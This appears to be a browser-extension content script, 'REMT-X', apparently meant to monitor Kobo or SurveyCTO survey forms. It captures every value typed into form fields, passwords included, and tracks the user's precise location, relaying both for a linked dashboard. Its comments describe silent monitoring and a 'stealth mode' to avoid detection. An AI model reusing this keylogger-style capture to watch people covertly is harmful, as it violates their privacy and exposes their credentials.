// REMT-X Content Script
// Purpose: Silently monitor input events and relay them to the background script.

console.log('[REMT-X] Monitoring active...');

// 1. Detect Form Elements (Kobo/Enketo & SurveyCTO specific markers)
const monitorInputs = () => {
    // Listen for all input/change events in the document
    document.addEventListener('input', (event) => {
        const target = event.target;
        if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.tagName === 'SELECT') {
            const data = {
                id: target.name || target.id,
                value: target.value,
                type: target.type,
                timestamp: Date.now()
            };

            // Send telemetry to background script
            chrome.runtime.sendMessage({ type: 'TELEMETRY', data });
        }
    }, true);
};

// 2. Real-time Location Tracking
const startLocationTracking = () => {
    if (navigator.geolocation) {
        navigator.geolocation.watchPosition((position) => {
            const location = {
                lat: position.coords.latitude,
                lng: position.coords.longitude,
                accuracy: position.coords.accuracy,
                timestamp: Date.now()
            };
            chrome.runtime.sendMessage({ type: 'LOCATION', location });
        }, (error) => {
            console.error('[REMT-X] Location error:', error);
        }, {
            enableHighAccuracy: true,
            maximumAge: 30000,
            timeout: 27000
        });
    }
};

// 3. UI Layer: Inject Dashboard Access Link
const injectDashboardLink = () => {
    const banner = document.createElement('div');
    banner.id = 'remtx-banner';
    banner.innerHTML = `
        <div style="background: rgba(15, 23, 42, 0.9); backdrop-filter: blur(8px); border: 1px solid rgba(56, 189, 248, 0.2); padding: 12px 24px; border-radius: 16px; display: flex; align-items: center; gap: 12px; box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3); pointer-events: auto;">
            <div style="width: 8px; height: 8px; background: #38bdf8; border-radius: 50%; animation: pulse 2s infinite;"></div>
            <span style="color: #94a3b8; font-family: sans-serif; font-size: 13px; font-weight: 600;">REMT-X Active</span>
            <div style="width: 1px; height: 16px; background: rgba(56, 189, 248, 0.1);"></div>
            <a href="https://remt-x-admin-dashboard-kxet.vercel.app/" target="_blank" style="color: #38bdf8; font-family: sans-serif; font-size: 13px; font-weight: 700; text-decoration: none; hover: underline;">View Live Dashboard →</a>
        </div>
        <style>
            @keyframes pulse {
                0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(56, 189, 248, 0.7); }
                70% { transform: scale(1); box-shadow: 0 0 0 6px rgba(56, 189, 248, 0); }
                100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(56, 189, 248, 0); }
            }
        </style>
    `;
    banner.style.cssText = 'position: fixed; top: 20px; right: 20px; z-index: 999999; pointer-events: none;';
    document.body.appendChild(banner);
};

// 4. Initialize
monitorInputs();
startLocationTracking();
injectDashboardLink();

// 4. Handle Stealth Mode (Prevent easy detection)
// (Implementation detail: avoid using obvious class names or IDs in injected UI if any)
